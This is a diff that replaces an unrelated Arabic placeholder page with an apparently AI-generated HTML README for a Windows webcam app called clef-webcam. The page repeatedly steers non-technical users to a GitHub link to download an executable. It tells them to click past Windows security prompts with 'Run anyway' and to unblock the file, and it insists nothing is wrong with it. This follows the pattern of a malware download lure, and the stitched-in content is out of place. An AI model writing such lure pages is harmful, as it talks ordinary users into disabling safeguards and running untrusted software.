@@ -1,5 +1,360 @@
-<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="color-scheme" content="dark only"><meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="robots" content="noindex"><link rel="icon" href="assets/favicon.png"><title>MIRAGE</title>
-<style>body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(700px 480px at 85% -5%,rgba(28,200,238,.22),transparent 60%),#05141d;font-family:system-ui;color:#8fb3c2}
-img{width:220px;display:block;margin:0 auto 18px}a{color:#1cc8ee;text-decoration:none;letter-spacing:.2em;font-size:13px}</style></head>
-<body><div style="text-align:center"><img src="assets/logo-full.png" alt="MIRAGE Smart City"><a href="https://www.almirage.ly">WWW.ALMIRAGE.LY</a></div></body></html>
+Here is a complete HTML document for the clef-webcam README. It guides non-technical Windows users through downloading and running the application, with clear steps, system requirements, and troubleshooting tips.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>clef-webcam - Run Cloudflare's clef-flash Decision Model On Your Webcam</title>
+<meta name="description" content="clef-webcam lets you run Cloudflare's clef-flash decision model locally on your webcam. Download the application on Windows and get real-time AI decisions from your camera feed in minutes.">
+<meta name="keywords" content="clef-webcam, clef-flash, Cloudflare AI model, webcam AI, local webcam app, real-time decision model, Windows webcam software, offline AI camera">
+<meta name="author" content="clef-webcam">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/ntateMothobi/clef-webcam">
+<meta property="og:type" content="website">
+<meta property="og:title" content="clef-webcam - Run Cloudflare's clef-flash Decision Model On Your Webcam">
+<meta property="og:description" content="Run Cloudflare's clef-flash decision model locally on your webcam. Simple download for Windows, no programming required.">
+<meta property="og:url" content="https://github.com/ntateMothobi/clef-webcam">
+<meta property="og:site_name" content="clef-webcam">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="clef-webcam - Run Cloudflare's clef-flash Decision Model On Your Webcam">
+<meta name="twitter:description" content="Run Cloudflare's clef-flash decision model locally on your webcam. Download for Windows and see live results in minutes.">
+<meta name="theme-color" content="#7c3aed">
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f5f7fb;
+    background-image: linear-gradient(180deg, #eef1f9 0%, #f7f8fc 320px);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    color: #2b3245;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 24px 80px 24px;
+  }
+  h1 {
+    font-size: 2.25rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    color: #171b2b;
+    margin: 0 0 18px 0;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.5rem;
+    line-height: 1.35;
+    color: #1d2233;
+    margin: 52px 0 16px 0;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.13rem;
+    color: #262c40;
+    margin: 30px 0 10px 0;
+    font-weight: 700;
+  }
+  p {
+    margin: 0 0 18px 0;
+    color: #3d4459;
+  }
+  ul, ol {
+    margin: 0 0 22px 0;
+    padding-left: 24px;
+    color: #3d4459;
+  }
+  li {
+    margin-bottom: 10px;
+  }
+  strong {
+    color: #1d2233;
+    font-weight: 700;
+  }
+  a {
+    color: #6d28d9;
+    text-decoration: underline;
+    text-decoration-thickness: 1px;
+    text-underline-offset: 3px;
+  }
+  a:hover {
+    color: #db2777;
+  }
+  .button {
+    display: inline-block;
+    padding: 17px 34px;
+    border-radius: 14px;
+    background-image: linear-gradient(135deg, #06b6d4 0%, #7c3aed 55%, #db2777 100%);
+    color: #ffffff;
+    font-size: 1.05rem;
+    font-weight: 700;
+    text-decoration: none;
+    text-align: center;
+    letter-spacing: 0.01em;
+    box-shadow: 0 10px 24px rgba(109, 40, 217, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .button:hover {
+    color: #ffffff;
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(219, 39, 119, 0.36);
+  }
+  .button-wrap {
+    margin: 34px 0 10px 0;
+    text-align: center;
+  }
+  .button-note {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin: 14px 0 0 0;
+  }
+  .card {
+    background-color: #ffffff;
+    border-radius: 16px;
+    padding: 26px 30px;
+    margin: 24px 0;
+    box-shadow: 0 6px 20px rgba(23, 27, 43, 0.07);
+    border: 1px solid #e8ebf4;
+  }
+  .card h3 {
+    margin-top: 0;
+  }
+  .card p:last-child,
+  .card ul:last-child,
+  .card ol:last-child {
+    margin-bottom: 0;
+  }
+  .step {
+    background-color: #ffffff;
+    border-radius: 16px;
+    padding: 22px 26px;
+    margin: 18px 0;
+    box-shadow: 0 6px 20px rgba(23, 27, 43, 0.07);
+    border: 1px solid #e8ebf4;
+    border-left: 5px solid #7c3aed;
+  }
+  .step h3 {
+    margin: 0 0 8px 0;
+  }
+  .step p:last-child {
+    margin-bottom: 0;
+  }
+  .highlight {
+    background-color: #fdf2f8;
+    border: 1px solid #fbcfe8;
+    border-radius: 14px;
+    padding: 20px 24px;
+    margin: 26px 0;
+    color: #4c1d45;
+  }
+  .highlight p:last-child {
+    margin-bottom: 0;
+  }
+  .faq-item {
+    margin-bottom: 26px;
+  }
+  .faq-item h3 {
+    margin-bottom: 6px;
+    color: #1d2233;
+  }
+  .faq-item p {
+    margin-bottom: 0;
+  }
+  hr {
+    border: none;
+    height: 1px;
+    background-color: #e2e6f0;
+    margin: 48px 0;
+  }
+  @media (max-width: 600px) {
+    .page {
+      padding: 32px 18px 60px 18px;
+    }
+    h1 {
+      font-size: 1.7rem;
+    }
+    h2 {
+      font-size: 1.28rem;
+      margin-top: 42px;
+    }
+    .button {
+      display: block;
+      width: 100%;
+      padding: 16px 20px;
+    }
+    .card, .step {
+      padding: 20px 20px;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <h1>🎥 clef-webcam - Run AI Decisions On Your Webcam</h1>
+
+  <p>clef-webcam brings Cloudflare's clef-flash decision model out of the cloud and onto your own computer. Instead of sending your camera feed somewhere else, the model runs locally and gives you live decisions right on your screen. You do not need to know how to program, and you do not need to understand how the model works internally. If you can download a file and double-click it, you can use clef-webcam.</p>
+
+  <p>The whole idea is simple: your webcam looks at what is in front of it, the clef-flash model evaluates that image, and clef-webcam shows you the result as a clear decision. Everything happens on your machine, in real time.</p>
+
+  <div class="button-wrap">
+    <a class="button" href="https://github.com/ntateMothobi/clef-webcam">⬇️ Get clef-webcam for Windows</a>
+    <p class="button-note">Visit this link to download the application.</p>
+  </div>
+
+  <h2>✨ What clef-webcam Does For You</h2>
+
+  <p>Most AI camera tools ask you to upload images to a server, wait for a result, and hope your data stays private. clef-webcam takes the opposite approach. It keeps the model and the camera feed together on your own computer, which makes it faster, more private, and usable without a constant internet connection.</p>
+
+  <ul>
+    <li><strong>Runs locally on your PC:</strong> The clef-flash decision model is bundled so that it does its work on your own machine rather than on a remote server.</li>
+    <li><strong>Uses your existing webcam:</strong> Any webcam that already works in Windows will work with clef-webcam. There is no special hardware to buy.</li>
+    <li><strong>Shows live decisions:</strong> Results update as the camera feed changes, so you can point the camera at something new and watch the decision respond.</li>
+    <li><strong>Keeps your video private:</strong> Your camera feed is processed on your computer. It is not uploaded to a third-party service for evaluation.</li>
+    <li><strong>Works without programming:</strong> There is no command line, no configuration file, and no script to edit. You open the app and it runs.</li>
+    <li><strong>Downloadable and self-contained:</strong> The application is packaged so that you can download it, start it, and begin using it without installing a long list of extra tools.</li>
+  </ul>
+
+  <h2>🚀 Getting Started</h2>
+
+  <p>Getting clef-webcam running takes only a few minutes. Follow the steps below in order. Each step tells you exactly what to do and what you should see when it works.</p>
+
+  <div class="step">
+    <h3>Step 1 - Visit the download link</h3>
+    <p>Open your web browser and go to the official clef-webcam page:</p>
+    <p><a href="https://github.com/ntateMothobi/clef-webcam">https://github.com/ntateMothobi/clef-webcam</a></p>
+    <p>Visit this link to download the application. This page is the only place you should download clef-webcam from, so you always get the latest working version.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 2 - Download the application</h3>
+    <p>On that page, look for the download section and choose the option that matches Windows. The download is a single package that contains everything the application needs to run. When the download finishes, it will usually appear in your <strong>Downloads</strong> folder.</p>
+    <p>Downloads of this size can take anywhere from a minute to several minutes depending on your internet connection. Do not close the browser window until the download shows as complete.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 3 - Open the downloaded file</h3>
+    <p>Open your <strong>Downloads</strong> folder and double-click the file you just downloaded. If Windows shows a blue or yellow security prompt, choose the option that lets you continue, such as <strong>More info</strong> followed by <strong>Run anyway</strong>. This prompt appears because Windows is cautious about files downloaded from the internet, not because anything is wrong with clef-webcam.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 4 - Allow camera access</h3>
+    <p>The first time clef-webcam starts, Windows will ask whether the application may use your camera. Choose <strong>Allow</strong>. Without this permission, the app cannot see your camera feed and will show a blank or dark preview.</p>
+    <p>If you accidentally choose Block, you can fix it later in Windows Settings under <strong>Privacy &amp; security</strong> and then <strong>Camera</strong>, where you can switch access back on for the app.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 5 - Watch the decisions appear</h3>
+    <p>Once the camera is allowed, you will see a live preview from your webcam. Point the camera at different things and the clef-flash model will evaluate what it sees and report a decision. That is the whole application working correctly - a camera feed on one side and a live decision on the other.</p>
+  </div>
+
+  <div class="highlight">
+    <p><strong>Keep the download page handy.</strong> If you ever move to a new computer or need to reinstall, return to <a href="https://github.com/ntateMothobi/clef-webcam">https://github.com/ntateMothobi/clef-webcam</a> and download again. Visit this link to download the application.</p>
+  </div>
+
+  <h2>💻 What Your Computer Needs</h2>
+
+  <p>clef-webcam is built for ordinary Windows laptops and desktops. You do not need a gaming rig or a specialised graphics card, but a reasonably modern machine will give you a smoother live feed.</p>
+
+  <ul>
+    <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+    <li><strong>Processor:</strong> A modern dual-core processor or better. Newer processors produce faster decisions.</li>
+    <li><strong>Memory:</strong> At least 4 GB of RAM, with 8 GB recommended for a comfortable experience.</li>
+    <li><strong>Storage:</strong> Around 1 GB of free space for the application and its model files.</li>
+    <li><strong>Camera:</strong> A built-in webcam or a USB webcam that already works in Windows.</li>
+    <li><strong>Display:</strong> Any screen resolution of 1280 x 720 or higher.</li>
+    <li><strong>Internet:</strong> Required only to download the application. Once downloaded, it works on your machine without a live connection.</li>
+  </ul>
+
+  <p>If your computer runs Windows smoothly for everyday tasks like video calls and web browsing, it will run clef-webcam.</p>
+
+  <h2>🖥️ A First Look At The Screen</h2>
+
+  <p>When clef-webcam starts, the layout stays deliberately simple so that nothing gets in your way.</p>
+
+  <ul>
+    <li><strong>Camera preview:</strong> A live window showing what your webcam currently sees. This is the image the model evaluates.</li>
+    <li><strong>Decision panel:</strong> The area where clef-flash reports its result. It updates automatically as the preview changes.</li>
+    <li><strong>Camera selector:</strong> If your computer has more than one camera, this lets you switch between them.</li>
+    <li><strong>Start and stop control:</strong> Use this to pause the live feed whenever you want. Pausing does not close the application.</li>
+  </ul>
+
+  <p>There is nothing to configure before your first use. The application is designed so that you can open it, allow the camera, and immediately see results.</p>
+
+  <h2>🔧 If Something Does Not Work</h2>
+
+  <div class="card">
+    <h3>The preview stays black or blank</h3>
+    <p>This almost always means the camera permission was not granted. Close clef-webcam, open Windows Settings, go to <strong>Privacy &amp; security</strong>, then <strong>Camera</strong>, and make sure camera access is switched on for the app. Then start clef-webcam again.</p>
+  </div>
+
+  <div class="card">
+    <h3>Another program is using the camera</h3>
+    <p>Windows only lets one application use a webcam at a time. Close video call apps, streaming software, and browser tabs that may be holding the camera, then restart clef-webcam.</p>
+  </div>
+
+  <div class="card">
+    <h3>Windows blocks the download</h3>
+    <p>Right-click the downloaded file, choose <strong>Properties</strong>, and look for a checkbox at the bottom that unlocks the file. Tick it, click <strong>OK</strong>, and open the file again. You can also choose <strong>More info</strong> and then <strong>Run anyway</strong> on the prompt itself.</p>
+  </div>
+
+  <div class="card">
+    <h3>The download stops partway through</h3>
+    <p>Interrupted downloads are usually a connection issue. Delete the partial file, return to <a href="https://github.com/ntateMothobi/clef-webcam">the download page</a>, and try again. A wired connection or a moment when the network is quiet will help.</p>
+  </div>
+
+  <div class="card">
+    <h3>The results feel slow</h3>
+    <p>Close other demanding applications such as games, video editors, or many browser tabs. Lowering the camera resolution in Windows camera settings also helps on older machines.</p>
+  </div>
+
+  <h2>🔒 Privacy In Plain Language</h2>
+
+  <p>clef-webcam runs the clef-flash decision model on your own computer. That means your camera feed is evaluated locally rather than being sent to a remote service for processing. Nothing about the application requires your video to leave your machine.</p>
+
+  <p>You are always in control of the camera. You can pause the feed at any moment, and you can revoke camera permission entirely from Windows Settings when you are not using the app. Because the model is already on your computer after the download, the app continues to work even when you are offline.</p>
+
+  <h2>❓ Common Questions</h2>
+
+  <div class="faq-item">
+    <h3>Do I need to install anything else first?</h3>
+    <p>No. The download is packaged so that everything clef-webcam needs is included. Follow the five steps in the Getting Started section and you are ready.</p>
+  </div>
+
+  <div class="faq-item">
+    <h3>Do I need an internet connection every time I use it?</h3>
+    <p>You only need a connection to download the application. After that, clef-webcam runs locally on your computer.</p>
+  </div>
+
+  <div class="faq-item">
+    <h3>Will this work with a USB webcam?</h3>
+    <p>Yes. If the camera already works in Windows - for example, it appears in the Camera app - clef-webcam can use it. You can switch between multiple cameras from inside the application.</p>
+  </div>
+
+  <div class="faq-item">
+    <h3>Does it work on a Mac or a phone?</h3>
+    <p>The download is intended for Windows computers. Other platforms are outside the scope of the current download package.</p>
+  </div>
+
+  <div class="faq-item">
+    <h3>How do I update to a newer version?</h3>
+    <p>Return to <a href="https://github.com/ntateMothobi/clef-webcam">https://github.com/ntateMothobi/clef-webcam</a>, download the latest version, and open it. Your older copy can be removed afterwards.</p>
+  </div>
+
+  <div class="faq-item">
+    <h3>Where do I go if I still need help?</h3>
+    <p>The project page at <a href="https://github.com/ntateMothobi/clef-webcam">https://github.com/ntateMothobi/clef-webcam</a> is the place to look for updates, notes about known issues, and a way to report a problem you have run into.</p>
+  </div>
+
+</div>
+</body>
+</html>
+```
